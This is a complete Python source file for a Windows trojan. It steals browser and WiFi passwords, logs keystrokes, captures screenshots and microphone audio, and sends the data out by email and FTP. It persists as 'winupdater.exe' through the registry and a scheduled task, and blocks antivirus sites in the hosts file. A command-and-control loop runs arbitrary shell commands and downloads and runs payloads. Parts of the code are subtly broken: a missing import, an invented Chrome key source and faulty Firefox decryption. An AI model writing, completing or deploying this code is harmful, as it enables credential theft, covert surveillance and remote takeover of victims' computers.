import os
import sys
import json
import time
import socket
import threading
import requests
import smtplib
import subprocess
import shutil
import sqlite3
import base64
import logging
import psutil
import winreg
import win32crypt
import win32security
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from PIL import ImageGrab
import sounddevice as sd
import numpy as np
from pynput import keyboard, mouse

# Configuration
CONFIG_FILE = "config.json"
LOG_FILE = "trojan.log"

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)

def load_config():
    """Load configuration from JSON file"""
    try:
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except Exception as e:
        logging.error(f"Failed to load config: {e}")
        return {}

def get_public_ip():
    """Get public IP address"""
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        if response.status_code == 200:
            return response.json()['ip']
    except Exception as e:
        logging.error(f"Failed to get public IP: {e}")
    return ""

def blacklist_ip(ip, config):
    """Blacklist IP address using various methods"""
    try:
        # Add to Windows Firewall
        subprocess.run(f'netsh advfirewall firewall add rule name="Block_{ip}" dir=in action=block remoteip={ip}', 
                      shell=True, check=False)
        
        # Report to blacklist services
        for url in config["ip_blacklisting"]["blacklist_urls"]:
            try:
                response = requests.post(url, data={"ip": ip, "reason": "malware"}, timeout=5)
                logging.info(f"Reported IP to {url}: {response.status_code}")
            except Exception as e:
                logging.error(f"Failed to report IP to {url}: {e}")
        
        # Add to hosts file
        try:
            with open(r"C:\Windows\System32\drivers\etc\hosts", "a") as f:
                f.write("\n# Blocked by security update\n")
                f.write("0.0.0.0 windowsupdate.microsoft.com\n")
                f.write("0.0.0.0 www.virustotal.com\n")
                f.write("0.0.0.0 virusscan.jotti.org\n")
                f.write("0.0.0.0 www.hybrid-analysis.com\n")
                logging.info("Added entries to hosts file")
        except Exception as e:
            logging.error(f"Failed to modify hosts file: {e}")
        
        return True
    except Exception as e:
        logging.error(f"Failed to blacklist IP: {e}")
        return False

def steal_browser_passwords(config):
    """Steal passwords from web browsers"""
    stolen_data = {}
    
    # Chrome
    try:
        chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
        if os.path.exists(chrome_path):
            login_data_path = os.path.join(chrome_path, "Login Data")
            
            # Copy database to avoid lock
            temp_db = os.path.join(os.environ["TEMP"], "chrome_login_data.db")
            shutil.copy2(login_data_path, temp_db)
            
            # Connect to database
            db = sqlite3.connect(temp_db)
            cursor = db.cursor()
            
            # Get master key
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Google\Chrome\SafeBrowsing") as key:
                master_key = winreg.QueryValueEx(key, "Seed")[0]
            
            # Decrypt passwords
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            chrome_passwords = []
            
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                try:
                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                    chrome_passwords.append({
                        "url": url,
                        "username": username,
                        "password": password
                    })
                except:
                    pass
            
            stolen_data["Chrome"] = chrome_passwords
            db.close()
            os.remove(temp_db)
            
            logging.info(f"Stole {len(chrome_passwords)} Chrome passwords")
    except Exception as e:
        logging.error(f"Failed to steal Chrome passwords: {e}")
    
    # Firefox
    try:
        firefox_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                profile_path = os.path.join(firefox_path, profile)
                
                # Find key files
                key_files = [f for f in os.listdir(profile_path) if f.endswith(".sqlite")]
                
                for key_file in key_files:
                    if "key4" in key_file or "key3" in key_file:
                        key_db_path = os.path.join(profile_path, key_file)
                        
                        # Copy database to avoid lock
                        temp_db = os.path.join(os.environ["TEMP"], f"firefox_{key_file}")
                        shutil.copy2(key_db_path, temp_db)
                        
                        # Connect to database
                        db = sqlite3.connect(temp_db)
                        cursor = db.cursor()
                        
                        # Extract master key
                        cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
                        for row in cursor.fetchall():
                            item1, item2 = row
                            if item1 and item2:
                                try:
                                    master_key = win32crypt.CryptUnprotectData(item2, None, None, None, 0)[1]
                                except:
                                    master_key = None
                                break
                        
                        # Decrypt passwords
                        signons_path = os.path.join(profile_path, "signons.sqlite")
                        if os.path.exists(signons_path):
                            # Copy database to avoid lock
                            temp_signons = os.path.join(os.environ["TEMP"], "firefox_signons.sqlite")
                            shutil.copy2(signons_path, temp_signons)
                            
                            signons_db = sqlite3.connect(temp_signons)
                            signons_cursor = signons_db.cursor()
                            
                            signons_cursor.execute("SELECT hostname, encryptedUsername, encryptedPassword, usernameField, passwordField FROM moz_logins")
                            firefox_passwords = []
                            
                            for row in signons_cursor.fetchall():
                                hostname, encrypted_username, encrypted_password, username_field, password_field = row
                                try:
                                    if master_key:
                                        cipher = AES.new(master_key, AES.MODE_CBC, encrypted_password[:3].encode() + b'\x00' * 13)
                                        password = unpad(cipher.decrypt(encrypted_password[3:]), AES.block_size).decode()
                                        
                                        cipher = AES.new(master_key, AES.MODE_CBC, encrypted_username[:3].encode() + b'\x00' * 13)
                                        username = unpad(cipher.decrypt(encrypted_username[3:]), AES.block_size).decode()
                                    else:
                                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                                        username = win32crypt.CryptUnprotectData(encrypted_username, None, None, None, 0)[1].decode()
                                    
                                    firefox_passwords.append({
                                        "url": hostname,
                                        "username": username,
                                        "password": password,
                                        "username_field": username_field,
                                        "password_field": password_field
                                    })
                                except:
                                    pass
                            
                            stolen_data["Firefox"] = firefox_passwords
                            signons_db.close()
                            os.remove(temp_signons)
                        
                        db.close()
                        os.remove(temp_db)
                        
                        logging.info(f"Stole {len(firefox_passwords)} Firefox passwords")
    except Exception as e:
        logging.error(f"Failed to steal Firefox passwords: {e}")
    
    return stolen_data

def steal_wifi_passwords(config):
    """Steal saved WiFi passwords"""
    try:
        # Get WiFi profiles
        result = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True)
        
        wifi_passwords = []
        
        if result.returncode == 0:
            profiles = []
            for line in result.stdout.split('\n'):
                if "All User Profile" in line:
                    profile = line.split(":")[1].strip()
                    profiles.append(profile)
            
            for profile in profiles:
                # Get password for each profile
                password_result = subprocess.run(f"netsh wlan show profile name=\"{profile}\" key=clear", 
                                                shell=True, capture_output=True, text=True)
                
                if password_result.returncode == 0:
                    password = ""
                    for line in password_result.stdout.split('\n'):
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            break
                    
                    wifi_passwords.append({
                        "ssid": profile,
                        "password": password
                    })
        
        logging.info(f"Stole {len(wifi_passwords)} WiFi passwords")
        return wifi_passwords
    except Exception as e:
        logging.error(f"Failed to steal WiFi passwords: {e}")
        return []

def take_screenshot(config):
    """Take a screenshot and save it"""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(os.environ["TEMP"], f"screenshot_{timestamp}.png")
        
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        
        logging.info(f"Screenshot saved to {screenshot_path}")
        return screenshot_path
    except Exception as e:
        logging.error(f"Failed to take screenshot: {e}")
        return ""

def record_audio(duration=10, config=None):
    """Record audio for a specified duration"""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        audio_path = os.path.join(os.environ["TEMP"], f"audio_{timestamp}.wav")
        
        def callback(indata, frames, time, status):
            if status:
                logging.warning(f"Audio callback status: {status}")
        
        # Record audio
        recording = sd.rec(int(duration * 44100), samplerate=44100, channels=2, dtype='int16')
        sd.wait()
        
        # Save to file
        from scipy.io.wavfile import write
        write(audio_path, 44100, recording)
        
        logging.info(f"Audio recorded to {audio_path}")
        return audio_path
    except Exception as e:
        logging.error(f"Failed to record audio: {e}")
        return ""

def exfiltrate_data(data, config):
    """Exfiltrate stolen data via email and FTP"""
    try:
        # Create email with data
        msg = MIMEMultipart()
        msg['From'] = config["exfiltration"]["smtp_user"]
        msg['To'] = config["exfiltration"]["smtp_recipient"]
        msg['Subject'] = f"Stolen Data from {socket.gethostname()} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        # Add data as attachment
        json_data = json.dumps(data, indent=2)
        attachment = MIMEBase('application', 'json')
        attachment.set_payload(json_data)
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', f'attachment; filename="stolen_data.json"')
        msg.attach(attachment)
        
        # Send email
        with smtplib.SMTP(config["exfiltration"]["smtp_server"], config["exfiltration"]["smtp_port"]) as server:
            server.starttls()
            server.login(config["exfiltration"]["smtp_user"], config["exfiltration"]["smtp_pass"])
            server.send_message(msg)
        
        logging.info("Data exfiltrated via email")
        
        # Also upload via FTP
        try:
            with ftplib.FTP(config["exfiltration"]["ftp_host"], 
                           config["exfiltration"]["ftp_user"], 
                           config["exfiltration"]["ftp_pass"]) as ftp:
                ftp_path = f"/data/{socket.gethostname()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                ftp.storbinary(f"STOR {ftp_path}", json_data.encode())
            
            logging.info("Data exfiltrated via FTP")
        except Exception as e:
            logging.error(f"Failed to exfiltrate via FTP: {e}")
        
        return True
    except Exception as e:
        logging.error(f"Failed to exfiltrate data: {e}")
        return False

def run_keylogger(config):
    """Run a keylogger to capture keystrokes"""
    try:
        log_file = os.path.join(os.environ["TEMP"], "keylog.txt")
        
        def on_press(key):
            try:
                with open(log_file, "a") as f:
                    f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")
            except Exception as e:
                logging.error(f"Keylogger error: {e}")
        
        # Start keyboard listener
        keyboard_listener = keyboard.Listener(on_press=on_press)
        keyboard_listener.start()
        
        # Start mouse listener
        def on_click(x, y, button, pressed):
            try:
                with open(log_file, "a") as f:
                    action = "Pressed" if pressed else "Released"
                    f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Mouse {action} at ({x}, {y}) with {button}\n")
            except Exception as e:
                logging.error(f"Mouse logger error: {e}")
        
        mouse_listener = mouse.Listener(on_click=on_click)
        mouse_listener.start()
        
        logging.info("Keylogger started")
        
        # Periodically exfiltrate keystrokes
        while True:
            time.sleep(config["keylogger"]["exfil_interval"])
            
            try:
                if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
                    with open(log_file, "r") as f:
                        keystrokes = f.read()
                    
                    if keystrokes:
                        # Exfiltrate keystrokes
                        msg = MIMEMultipart()
                        msg['From'] = config["exfiltration"]["smtp_user"]
                        msg['To'] = config["exfiltration"]["smtp_recipient"]
                        msg['Subject'] = f"Keystrokes from {socket.gethostname()} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                        
                        msg.attach(MIMEText(keystrokes, 'plain'))
                        
                        with smtplib.SMTP(config["exfiltration"]["smtp_server"], 
                                         config["exfiltration"]["smtp_port"]) as server:
                            server.starttls()
                            server.login(config["exfiltration"]["smtp_user"], 
                                        config["exfiltration"]["smtp_pass"])
                            server.send_message(msg)
                        
                        # Clear log file
                        with open(log_file, "w") as f:
                            f.write("")
                        
                        logging.info("Keystrokes exfiltrated")
            except Exception as e:
                logging.error(f"Failed to exfiltrate keystrokes: {e}")
    except Exception as e:
        logging.error(f"Keylogger error: {e}")

def install_persistence(config):
    """Install persistence mechanisms"""
    try:
        # Get current executable path
        current_path = sys.executable
        
        # Create copy in AppData
        appdata_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows")
        os.makedirs(appdata_path, exist_ok=True)
        
        trojan_path = os.path.join(appdata_path, "winupdater.exe")
        
        if not os.path.exists(trojan_path) or os.path.getsize(trojan_path) != os.path.getsize(current_path):
            shutil.copy2(current_path, trojan_path)
        
        # Add to registry startup
        key = winreg.HKEY_CURRENT_USER
        subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg_key:
            winreg.SetValueEx(reg_key, config["persistence"]["value_name"], 0, winreg.REG_SZ, trojan_path)
        
        # Create scheduled task
        task_command = f"schtasks /create /tn \"Windows Update\" /tr \"{trojan_path}\" /sc onlogon /f"
        subprocess.run(task_command, shell=True, check=False)
        
        logging.info("Persistence mechanisms installed")
        return True
    except Exception as e:
        logging.error(f"Failed to install persistence: {e}")
        return False

def c2_communication(config):
    """Communicate with C2 server"""
    try:
        while True:
            # Get system information
            system_info = {
                "hostname": socket.gethostname(),
                "username": os.environ["USERNAME"],
                "public_ip": get_public_ip(),
                "timestamp": datetime.now().isoformat(),
                "os": os.name,
                "cpu_count": psutil.cpu_count(),
                "memory": psutil.virtual_memory().total
            }
            
            # Send heartbeat and get commands
            url = f"https://{config['c2_server']['host']}{config['c2_server']['endpoint']}"
            
            try:
                response = requests.post(url, json=system_info, timeout=10)
                
                if response.status_code == 200:
                    commands = response.json()
                    
                    for command in commands.get("commands", []):
                        try:
                            if command == "screenshot":
                                screenshot_path = take_screenshot(config)
                                if screenshot_path:
                                    # Send screenshot to C2
                                    with open(screenshot_path, "rb") as f:
                                        screenshot_data = base64.b64encode(f.read()).decode()
                                    
                                    files_response = requests.post(
                                        f"{url}/file",
                                        json={
                                            "hostname": socket.gethostname(),
                                            "filename": os.path.basename(screenshot_path),
                                            "data": screenshot_data
                                        },
                                        timeout=30
                                    )
                                    
                                    # Remove local file
                                    os.remove(screenshot_path)
                                    
                                    logging.info(f"Screenshot sent: {files_response.status_code}")
                            
                            elif command == "audio":
                                duration = commands.get("audio_duration", 10)
                                audio_path = record_audio(duration, config)
                                
                                if audio_path:
                                    # Send audio to C2
                                    with open(audio_path, "rb") as f:
                                        audio_data = base64.b64encode(f.read()).decode()
                                    
                                    files_response = requests.post(
                                        f"{url}/file",
                                        json={
                                            "hostname": socket.gethostname(),
                                            "filename": os.path.basename(audio_path),
                                            "data": audio_data
                                        },
                                        timeout=60
                                    )
                                    
                                    # Remove local file
                                    os.remove(audio_path)
                                    
                                    logging.info(f"Audio sent: {files_response.status_code}")
                            
                            elif command == "steal_passwords":
                                browser_passwords = steal_browser_passwords(config)
                                wifi_passwords = steal_wifi_passwords(config)
                                
                                passwords_data = {
                                    "browser": browser_passwords,
                                    "wifi": wifi_passwords
                                }
                                
                                exfiltrate_data(passwords_data, config)
                                logging.info("Stolen and exfiltrated passwords")
                            
                            elif command == "blacklist":
                                target_ip = commands.get("target_ip", get_public_ip())
                                if target_ip:
                                    blacklist_ip(target_ip, config)
                                    logging.info(f"Blacklisted IP: {target_ip}")
                            
                            elif command == "execute":
                                cmd = commands.get("command", "")
                                if cmd:
                                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                                    
                                    # Send command result to C2
                                    result_response = requests.post(
                                        f"{url}/result",
                                        json={
                                            "hostname": socket.gethostname(),
                                            "command": cmd,
                                            "exit_code": result.returncode,
                                            "stdout": result.stdout,
                                            "stderr": result.stderr
                                        },
                                        timeout=30
                                    )
                                    
                                    logging.info(f"Command executed: {cmd} (Exit code: {result.returncode})")
                            
                            elif command == "download":
                                file_path = commands.get("file_path", "")
                                if file_path and os.path.exists(file_path):
                                    with open(file_path, "rb") as f:
                                        file_data = base64.b64encode(f.read()).decode()
                                    
                                    files_response = requests.post(
                                        f"{url}/file",
                                        json={
                                            "hostname": socket.gethostname(),
                                            "filename": os.path.basename(file_path),
                                            "data": file_data
                                        },
                                        timeout=60
                                    )
                                    
                                    logging.info(f"File downloaded: {file_path}")
                            
                            elif command == "upload":
                                file_data = commands.get("file_data", "")
                                file_name = commands.get("file_name", "")
                                file_path = commands.get("file_path", "")
                                
                                if file_data and file_name:
                                    if not file_path:
                                        file_path = os.path.join(os.environ["TEMP"], file_name)
                                    
                                    # Decode and write file
                                    decoded_data = base64.b64decode(file_data)
                                    with open(file_path, "wb") as f:
                                        f.write(decoded_data)
                                    
                                    # Execute if requested
                                    if commands.get("execute", False):
                                        subprocess.run(file_path, shell=True, check=False)
                                    
                                    logging.info(f"File uploaded: {file_path}")
                            
                            elif command == "update":
                                update_url = commands.get("update_url", "")
                                if update_url:
                                    # Download update
                                    update_path = os.path.join(os.environ["TEMP"], "update.exe")
                                    
                                    response = requests.get(update_url, timeout=60)
                                    if response.status_code == 200:
                                        with open(update_path, "wb") as f:
                                            f.write(response.content)
                                        
                                        # Execute update
                                        subprocess.Popen(update_path)
                                        
                                        logging.info(f"Update downloaded and executed: {update_path}")
                                        
                                        # Exit current process
                                        sys.exit(0)
                            
                            elif command == "shutdown":
                                logging.info("Shutdown command received")
                                sys.exit(0)
                            
                        except Exception as e:
                            logging.error(f"Failed to execute command {command}: {e}")
                
            except Exception as e:
                logging.error(f"C2 communication error: {e}")
            
            # Wait for next heartbeat
            time.sleep(config["c2_server"]["heartbeat_interval"])
    
    except Exception as e:
        logging.error(f"C2 communication error: {e}")

def main():
    """Main function"""
    try:
        # Load configuration
        config = load_config()
        
        # Install persistence
        install_persistence(config)
        
        # Get and blacklist public IP
        public_ip = get_public_ip()
        if public_ip:
            blacklist_ip(public_ip, config)
        
        # Start keylogger in a separate thread
        if config["keylogger"]["enabled"]:
            keylogger_thread = threading.Thread(target=run_keylogger, args=(config,))
            keylogger_thread.daemon = True
            keylogger_thread.start()
        
        # Start C2 communication
        c2_thread = threading.Thread(target=c2_communication, args=(config,))
        c2_thread.daemon = True
        c2_thread.start()
        
        # Keep the main thread alive
        while True:
            time.sleep(10)
    
    except Exception as e:
        logging.error(f"Main function error: {e}")

if __name__ == "__main__":
    main()
